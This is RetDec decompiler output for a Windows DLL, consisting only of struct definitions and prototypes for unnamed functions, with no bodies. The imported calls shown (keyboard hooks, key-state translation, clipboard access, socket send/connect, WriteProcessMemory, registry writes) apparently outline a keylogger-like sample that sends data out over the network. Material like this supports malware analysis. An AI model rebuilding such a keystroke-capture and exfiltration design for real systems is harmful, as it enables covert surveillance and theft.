//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <windows.h>

// ----------------- Float Types Definitions ------------------

typedef long double float80_t;

// ------------------------ Structures ------------------------

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _EXCEPTION_POINTERS {
    struct _EXCEPTION_RECORD * e0;
    struct _CONTEXT * e1;
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tagPOINT {
    int32_t e0;
    int32_t e1;
};

struct tagMSG {
    int32_t * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    struct tagPOINT e5;
};

// ------------------- Function Prototypes --------------------

int32_t DllCanUnloadNow(void);
int32_t DllGetClassObject(int32_t a1);
int32_t DllRegisterServer(void);
int32_t DllUnregisterServer(void);
int32_t entry_point(void);
int32_t function_40103b(void);
int32_t function_401041(int32_t a1);
int32_t function_401049(int16_t a1);
int32_t function_401062(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, char * a5);
void function_401072(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue);
int32_t function_40107a(struct _EXCEPTION_POINTERS * ExceptionInfo);
bool function_401082(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToWrite, int32_t * lpNumberOfBytesWritten, struct _OVERLAPPED * lpOverlapped);
void function_40108a(int32_t uExitCode);
int32_t function_401092(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType);
bool function_40109a(int32_t * hLibModule);
char * function_4010a2(void);
int32_t function_4010aa(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData);
void function_4010b2(struct _STARTUPINFOA * lpStartupInfo);
int32_t function_4010ba(void);
int32_t function_4010c2(int32_t * hKey);
int32_t function_4010ca(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult);
int32_t function_4010d2(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData);
int32_t function_4010da(int16_t ** pbstr, int16_t * psz, int32_t len);
void function_4010e2(int16_t * bstrString);
int32_t function_4010ea(void);
int32_t function_4010f2(void);
bool function_4010fa(struct _LARGE_INTEGER * lpPerformanceCount);
int32_t function_401102(void);
int32_t function_40110a(void);
int32_t * function_40112e(int32_t uFlags, int32_t uBytes);
int32_t * function_401136(int32_t * hMem);
int32_t * function_40113e(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect);
bool function_401146(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType);
void function_40114e(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_401156(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_40115e(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_401166(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
int32_t function_40116e(int32_t a1, int32_t a2);
int32_t function_4011be(void);
int32_t function_4011c6(void);
int32_t function_4011f6(void);
int32_t function_40120e(void);
int32_t function_40127e(void);
int32_t function_401312(void);
int32_t function_401376(void);
int32_t function_4013ee(void);
int32_t function_4014a6(void);
int32_t function_40153a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4015ba(int32_t a1);
int32_t function_40164a(int32_t a1, int32_t a2);
int32_t function_40176e(void);
int32_t function_4017fa(int32_t a1);
int32_t function_4018b0(void);
int32_t function_4018b5(void);
int32_t function_4018b7(int32_t a1);
int32_t function_4018be(void);
int32_t function_40199e(void);
int32_t function_401a02(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401a32(void);
int32_t function_401a62(void);
int32_t function_401a86(void);
int32_t function_401aae(void);
int32_t function_401b1e(void);
int32_t function_401b56(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401c06(void);
int32_t function_401c8e(void);
int32_t function_401cda(void);
int32_t function_401d66(void);
int32_t function_401d92(void);
int32_t function_401dc6(void);
int32_t function_401df2(void);
int32_t function_401ee6(void);
int32_t function_402062(void);
int32_t function_402067(void);
int32_t function_402069(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_402076(void);
int32_t function_402208(void);
int32_t function_40220d(void);
int32_t function_40220f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40221a(void);
int32_t function_4023f6(int32_t a1);
int32_t function_4024a7(void);
int32_t function_4024ac(void);
int32_t function_4024ae(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4024ba(void);
int32_t function_4024da(void);
int32_t function_4024fa(void);
int32_t function_40254a(void);
int32_t function_402555(void);
int32_t function_402556(void);
int32_t function_40259d(int32_t a1, int32_t a2);
int32_t function_4025a2(int32_t a1);
int32_t function_4025ad(void);
int32_t function_4025ae(int32_t a1, int32_t a2);
int32_t function_4025be(void);
int32_t function_4025fe(void);
int32_t function_402626(void);
int32_t function_402636(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40263e(void);
int32_t function_402696(void);
int32_t function_4026b2(void);
int32_t function_402722(void);
int32_t function_402742(void);
int32_t function_4027a2(int32_t a1, int32_t a2);
int32_t function_4027ae(void);
int32_t function_402882(void);
int32_t function_40288e(void);
int32_t function_4028b2(int32_t nTypeFlag);
int32_t function_4028ba(void);
int32_t function_4028ea(void);
int32_t function_402981(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18);
int32_t function_402a66(int32_t a1);
int32_t function_402a86(int32_t a1, int32_t a2);
int32_t function_402ab6(void);
int32_t function_402abe(void);
int32_t function_402ac2(void);
int32_t function_402ac6(void);
int32_t function_402aca(void);
int32_t function_402af0(void);
int32_t function_402af2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_402b1b(void);
int32_t function_402b20(int32_t a1);
int32_t function_402b42(void);
int32_t function_402b4a(void);
int32_t function_402b5a(void);
int32_t function_402b6a(void);
int32_t function_402b86(void);
int32_t function_402baa(int32_t a1, int32_t a2);
int32_t function_402bc2(int32_t a1);
int32_t function_402bd6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402bf6(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_402c1e(void);
int32_t function_402c3a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402c5a(int32_t a1, int32_t ExceptionInfo2, int32_t a3);
int32_t function_402d86(int32_t a1, int32_t a2);
int32_t function_402dbe(int32_t a1);
int32_t function_402e12(int32_t a1);
int32_t function_402e41(void);
int32_t function_402e42(int32_t a1, int32_t result);
int32_t function_402e57(void);
int32_t function_402e5a(int32_t a1);
int32_t function_402ef6(int32_t a1);
int32_t function_402efa(int32_t a1, int32_t a2);
int32_t function_402f9a(void);
int32_t function_402fba(void);
int32_t function_402fe2(void);
int32_t function_403042(int32_t a1);
int32_t function_4030a2(int32_t a1);
int32_t function_403169(void);
int32_t function_40316a(void);
int32_t function_4031c6(void);
int32_t function_4031f3(void);
int32_t function_4031f6(void);
int32_t function_403282(void);
int32_t function_403355(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40335a(void);
int32_t function_403364(void);
int32_t function_403366(int32_t a1);
int32_t function_403371(void);
int32_t function_403372(void);
int32_t function_403396(void);
int32_t function_4033c6(void);
int32_t function_40340a(void);
int32_t function_403436(void);
int32_t function_403466(void);
int32_t function_403476(void);
int32_t function_4034a2(void);
int32_t function_4034a6(void);
int32_t function_4034b0(void);
int32_t function_4034b2(void);
int32_t function_4034c9(void);
int32_t function_4034ca(void);
int32_t function_4034d2(void);
int32_t function_403516(void);
int32_t function_403589(void);
int32_t function_40358a(int32_t result);
int32_t function_403613(void);
int32_t function_403616(void);
int32_t function_4036ba(void);
int32_t function_4036ca(void);
int32_t function_4036d6(void);
int32_t function_40371a(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40371f(void);
int32_t function_403722(void);
int32_t function_403727(void);
int32_t function_40372a(int32_t * a1);
int32_t function_403769(void);
int32_t function_40376a(void);
int32_t function_4037b2(void);
int32_t function_40380e(void);
int32_t function_403856(void);
int32_t function_4038ba(void);
int32_t function_4038c1(void);
int32_t function_4038c2(void);
int32_t function_4038da(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4038fe(void);
int32_t function_403922(void);
int32_t function_403956(void);
int32_t function_40396d(void);
int32_t function_40396e(void);
int32_t function_403a5a(void);
int32_t function_403a71(void);
int32_t function_403a72(void);
int32_t function_403b8e(int32_t a1);
int32_t function_403c80(void);
int32_t function_403c82(void);
int32_t function_403c89(void);
int32_t function_403c8a(void);
int32_t function_403c92(void);
int32_t function_403c9a(int32_t a1);
int32_t function_403caa(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_403caf(void);
int32_t function_403cb2(int32_t a1, int32_t a2);
int32_t function_403cba(int32_t a1);
int32_t function_403e46(void);
int32_t function_403e52(void);
int32_t function_403e8e(void);
int32_t function_403eb6(void);
int32_t function_403f12(void);
int32_t function_403f22(void);
int32_t function_403f86(void);
int32_t function_403f8b(void);
int32_t function_403f8d(int32_t a1, int32_t a2);
int32_t function_403f92(void);
int32_t function_403faa(void);
int32_t function_403fd6(void);
int32_t function_40403c(void);
int32_t function_404041(void);
int32_t function_404043(int32_t a1);
int32_t function_40404a(void);
int32_t function_404094(void);
int32_t function_404099(void);
int32_t function_40409b(int32_t a1);
int32_t function_40409e(void);
int32_t function_404172(int32_t a1, int32_t a2);
int32_t function_40417a(int32_t a1);
int32_t function_404182(void);
bool function_40418a(int32_t dwTlsIndex);
int32_t * function_404192(int32_t dwTlsIndex);
bool function_40419a(int32_t dwTlsIndex, int32_t * lpTlsValue);
int32_t function_4041a2(void);
int32_t function_4041ae(int32_t a1);
int32_t function_4041b6(void);
int32_t function_4041fa(void);
int32_t function_404226(void);
int32_t function_40424e(void);
int32_t function_404272(void);
int32_t function_4042b2(int32_t a1, int32_t a2);
int32_t function_4042be(void);
int32_t function_404306(void);
int32_t function_40432b(void);
int32_t function_404330(void);
int32_t function_404332(int32_t a1);
int32_t function_404336(void);
int32_t function_40433e(void);
int32_t function_404363(void);
int32_t function_404368(void);
int32_t function_40436a(int32_t a1);
int32_t function_40436e(void);
int32_t function_404376(void);
int32_t function_40437e(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition);
int32_t function_404386(int32_t * hKey, char * lpSubKey);
int32_t function_40438e(int32_t a1, int32_t * a2, int32_t a3, int32_t a4, char * a5, int32_t a6);
int32_t function_404396(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5, char * a6, int32_t a7);
int32_t function_40439e(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData);
bool function_4043a6(int32_t * hObject);
int32_t function_4043ae(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2);
bool function_4043b6(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists);
int32_t * function_4043be(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile);
int32_t * function_4043c6(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId);
bool function_4043ce(char * lpFileName);
int32_t function_4043d6(int32_t a1);
int32_t * function_4043de(int32_t * hModule, char * lpName, char * lpType);
void function_4043e6(int32_t * hLibModule, int32_t dwExitCode);
int32_t * function_4043ee(void);
int32_t function_4043f6(int32_t * hFile, int32_t * lpFileSizeHigh);
int32_t function_4043fe(int32_t * hModule, char * lpFilename, int32_t nSize);
int32_t * function_404406(char * lpModuleName);
int32_t (*function_40440e(int32_t * hModule, char * lpProcName))();
int32_t function_404416(int32_t nBufferLength, char * lpBuffer);
int32_t function_40441e(void);
int32_t * function_404426(int32_t uFlags, int32_t dwBytes);
int32_t * function_40442e(int32_t * hMem);
int32_t * function_404436(int32_t * hMem);
bool function_40443e(int32_t * hMem);
int32_t * function_404446(char * lpLibFileName);
bool function_40444e(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped);
bool function_404456(int32_t * hFile);
void function_40445e(int32_t dwMilliseconds);
bool function_404466(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect);
int32_t function_40446e(void);
bool function_404476(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten);
int32_t function_40447e(char * lpString1, char * lpString2);
char * function_404486(char * lpString1, char * lpString2);
bool function_40448e(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer);
int32_t * function_404496(int32_t i);
int32_t * function_40449e(int32_t * hdc, int32_t * h);
int32_t function_4044a6(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam);
bool function_4044ae(void);
int32_t function_4044b6(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_4044be(struct tagMSG * lpMsg);
bool function_4044c6(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam);
int32_t * function_4044ce(char * lpClassName, char * lpWindowName);
int32_t * function_4044d6(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow);
bool function_4044de(struct tagPOINT * lpPoint);
int32_t function_4044e6(int32_t * hWnd, int32_t nIndex);
int32_t function_4044ee(int32_t * hWnd, char * lpClassName, int32_t nMaxCount);
int32_t * function_4044f6(int32_t uFormat);
int32_t * function_4044fe(int32_t * hWnd);
bool function_404506(char * lpKeyState);
bool function_40450e(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax);
int32_t * function_404516(int32_t * hWnd);
int32_t * function_40451e(int32_t * hWnd);
int32_t * function_404526(int32_t * hWnd, int32_t uCmd);
int32_t function_40452e(int32_t * hWnd, int32_t nIndex);
int32_t function_404536(int32_t * hWnd, int32_t * lpdwProcessId);
bool function_40453e(int32_t * hWnd);
bool function_404546(int32_t * hWnd);
bool function_40454e(int32_t * hWnd, int32_t uIDEvent);
int32_t * function_404556(int32_t * hInstance, char * lpIconName);
bool function_40455e(int32_t * hWndNewOwner);
bool function_404566(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
void function_40456e(int32_t nExitCode);
int32_t function_404576(int32_t * hWnd, int32_t * hDC);
int32_t function_40457e(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_404586(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t));
int32_t function_40458e(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong);
int32_t * function_404596(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId);
int32_t function_40459e(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags);
bool function_4045a6(int32_t * hhk);
int32_t function_4045ae(void);
int32_t * function_4045b6(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam);
int32_t function_4045be(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle);
int32_t function_404616(void);
int32_t function_40463b(void);
int32_t function_404640(void);
int32_t function_404642(int32_t a1);
int32_t function_404646(void);
int32_t function_404651(void);
int32_t function_4046c3(void);
int32_t function_4046c8(void);
int32_t function_4046ca(int32_t a1);
int32_t function_4046ce(void);
int32_t function_4046d6(void);
int32_t function_404712(void);
int32_t function_404737(void);
int32_t function_40473c(void);
int32_t function_40473e(int32_t a1);
int32_t function_404742(void);
int32_t function_40474a(void);
int32_t function_40476f(void);
int32_t function_404774(void);
int32_t function_404776(int32_t a1);
int32_t function_40477a(void);
int32_t function_404782(int32_t s);
int32_t function_40478a(int32_t s, struct sockaddr * name, int32_t namelen);
int16_t function_404792(int16_t hostshort);
char * function_40479a(struct in_addr in);
int32_t function_4047a2(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_4047aa(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_4047b2(int32_t af, int32_t type, int32_t protocol);
struct hostent * function_4047ba(char * name);
int32_t function_4047c2(char * name, int32_t namelen);
int32_t function_4047ca(int16_t wVersionRequested, struct WSAData * lpWSAData);
int32_t function_4047d2(void);
int32_t function_4047da(void);
int32_t function_4047ff(void);
int32_t function_404804(void);
int32_t function_404806(int32_t a1);
int32_t function_40480a(void);
int32_t function_4049aa(void);
int32_t function_4049cf(void);
int32_t function_4049d4(void);
int32_t function_4049d6(int32_t a1);
int32_t function_4049da(void);
int32_t function_4049e2(void);
int32_t function_404a07(void);
int32_t function_404a0c(void);
int32_t function_404a0e(int32_t a1);
int32_t function_404a12(void);
int32_t * function_404a1a(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd);
int32_t function_404a22(void);
int32_t function_404a47(void);
int32_t function_404a4c(void);
int32_t function_404a4e(int32_t a1);
int32_t function_404a52(void);
int32_t function_404a5a(void);
int32_t function_404a7f(void);
int32_t function_404a84(void);
int32_t function_404a86(int32_t a1);
int32_t function_404a8a(void);
int32_t function_404a92(void);
int32_t function_404ab7(void);
int32_t function_404abc(void);
int32_t function_404abe(int32_t a1);
int32_t function_404ac2(void);
int32_t function_404aca(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5);
int32_t function_404ad2(void);
int32_t function_404af7(void);
int32_t function_404afc(void);
int32_t function_404afe(int32_t a1);
int32_t function_404b02(void);
int32_t function_404b0a(void);
int32_t function_404b22(void);
int32_t function_404c46(void);
int32_t function_404c4b(void);
int32_t function_404c4d(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404c71(void);
int32_t function_404c7a(void);
int32_t function_404ce8(void);
int32_t function_404ced(void);
int32_t function_404cef(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_404cf9(void);
int32_t function_404d27(void);
int32_t function_404d2c(void);
int32_t function_404d2e(int32_t a1);
int32_t function_404d32(void);
int32_t function_404d3a(void);
int32_t function_404dbd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_404e90(void);
int32_t function_404e95(void);
int32_t function_404e97(void);
int32_t function_404e9b(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_404f8a(void);
int32_t function_404faf(void);
int32_t function_404fb4(void);
int32_t function_404fb6(int32_t a1);
int32_t function_404fba(void);
int32_t function_404fc2(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4050d6(void);
int32_t function_4050db(void);
int32_t function_4050dd(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4050e6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4051a5(void);
int32_t function_4051aa(void);
int32_t function_4051ac(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4051b2(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40522c(void);
int32_t function_405231(void);
int32_t function_405233(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405237(void);
int32_t function_4052b2(int32_t hhk, int32_t nCode, int32_t wParam);
int32_t function_4052fa(void);
int32_t function_405332(void);
int32_t function_40534a(void);
int32_t function_40536f(void);
int32_t function_405374(void);
int32_t function_405376(int32_t a1);
int32_t function_40537a(void);
int32_t function_405385(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_40543e(void);
int32_t function_4055fa(void);
int32_t function_4055ff(void);
int32_t function_405601(int32_t a1, int32_t a2);
int32_t function_40560a(void);
int32_t function_405666(void);
int32_t function_40570a(void);
int32_t function_40570f(void);
int32_t function_405711(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40571a(void);
int32_t function_405726(void);
int32_t function_405797(void);
int32_t function_40579c(void);
int32_t function_40579e(int32_t a1);
int32_t function_4057a6(void);
int32_t function_4057d2(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_405a47(void);
int32_t function_405a4c(void);
int32_t function_405a4e(int32_t a1);
int32_t function_405b19(void);
int32_t function_405b61(void);
int32_t function_405b66(void);
int32_t function_405b68(int32_t a1);
int32_t function_405b6a(void);
int32_t function_405b72(void);
int32_t function_405c87(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_405d82(void);
int32_t function_405db9(void);
int32_t function_405dbe(void);
int32_t function_405dc0(int32_t a1);
int32_t function_405dc2(void);
int32_t function_405e04(void);
int32_t function_405e09(void);
int32_t function_405e0b(int32_t a1);
int32_t function_405e0e(void);
int32_t function_405e10(int32_t a1);
int32_t function_405f51(void);
int32_t function_405f56(void);
int32_t function_405f58(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405f69(void);
int32_t function_405f78(void);
int32_t function_405f82(int32_t a1);
int32_t function_405f92(void);
int32_t function_405fb7(void);
int32_t function_405fbc(void);
int32_t function_405fbe(int32_t a1);
int32_t function_405fc2(void);
int32_t function_405fca(void);
int32_t function_406005(void);
int32_t function_40603e(void);
int32_t function_40605e(void);
int32_t function_40606a(void);
int32_t function_406092(void);
int32_t function_4060b2(void);
int32_t function_4060d7(void);
int32_t function_4060dc(void);
int32_t function_4060de(int32_t a1);
int32_t function_4060e2(void);
int32_t function_4060ea(void);
int32_t function_4060f2(void);
int32_t function_40617e(void);
int32_t function_406183(void);
int32_t function_406185(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40618e(void);
int32_t function_4061c6(void);
int32_t function_40630d(void);
int32_t function_406312(void);
int32_t function_406314(int32_t a1);
int32_t function_406339(int32_t a1, int32_t a2);
int32_t function_4065ee(void);
int32_t function_4065f3(void);
int32_t function_4065f5(int32_t a1);
int32_t function_406621(void);
int32_t function_406629(void);
int32_t function_406630(void);
int32_t function_40666c(void);
int32_t function_40666e(void);
int32_t function_40671e(void);
int32_t function_406753(int32_t result2, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7);
int32_t function_406873(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_406ae8(void);
int32_t function_406aed(void);
int32_t function_406aef(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406b26(void);
int32_t function_406c2a(void);
int32_t function_406c2f(void);
int32_t function_406c31(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406c66(void);
int32_t function_406d55(void);
int32_t function_406d5a(void);
int32_t function_406d5c(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406d66(void);
int32_t function_406dac(void);
int32_t function_406db1(void);
int32_t function_406db3(int32_t a1);
int32_t function_406db6(void);
int32_t function_406df8(void);
int32_t function_406dfd(void);
int32_t function_406dff(int32_t a1);
bool function_406e02(char * pszPath);
int32_t function_406e0a(void);
int32_t function_406e4a(int32_t a1, int32_t nIndex);
int32_t function_406f1c(void);
int32_t function_406f21(void);
int32_t function_406f23(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406f2e(int32_t a1, uint32_t a2, int32_t a3);
int32_t function_406fb6(void);
int32_t function_406fce(int32_t a1);
int32_t function_406fe6(void);
int32_t function_406ffa(void);
int32_t function_407022(void);
int32_t function_407056(void);
int32_t function_40708e(void);
int32_t function_4070ce(void);
int32_t function_407106(void);
int32_t function_407136(void);
int32_t function_4071b0(void);
int32_t function_4071b5(void);
int32_t function_4071b7(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4071c2(void);
int32_t function_407223(void);
int32_t function_407228(void);
int32_t function_40722a(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407245(void);
float80_t function_40724d(void);
int32_t function_407252(void);
int32_t function_4072d1(void);
int32_t function_4072d6(void);
int32_t function_4072d8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4072ee(void);
int32_t function_40734a(void);
int32_t function_407457(void);
int32_t function_40745c(void);
int32_t function_40745e(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40747e(void);
int32_t function_407496(void);
int32_t function_407502(void);
int32_t function_407527(void);
int32_t function_40752c(void);
int32_t function_40752e(int32_t a1);
int32_t function_407532(void);
int32_t function_40753a(int32_t nCode, int32_t wParam, int32_t lParam);
int32_t function_407592(void);
int32_t function_4075b7(void);
int32_t function_4075bc(void);
int32_t function_4075be(int32_t a1);
int32_t function_4075c2(void);
int32_t * function_4075ca(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size);
int32_t function_4075d2(void);
int32_t function_4075f7(void);
int32_t function_4075fc(void);
int32_t function_4075fe(int32_t a1);
int32_t function_407602(void);
int32_t function_407637(void);
int32_t function_40763d(int32_t a1);
int32_t function_407645(int32_t a1);
int32_t function_4076ee(void);
int32_t function_407736(int32_t a1, int32_t a2);
int32_t function_4077ee(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4077f2(void);
int32_t function_407817(void);
int32_t function_40781c(void);
int32_t function_40781e(int32_t a1);
int32_t function_407822(void);
int32_t function_40782a(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_407876(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4078a6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40793e(void);
int32_t function_407943(void);
int32_t function_407945(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407955(void);
int32_t function_407957(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15);
int32_t function_407ace(void);
int32_t function_407ad6(void);
int32_t function_407ae2(void);
int32_t function_407b01(void);
int32_t function_407b06(void);
int32_t function_407b08(int32_t a1);
int32_t function_407b0a(int32_t a1, int32_t a2, int32_t a3);
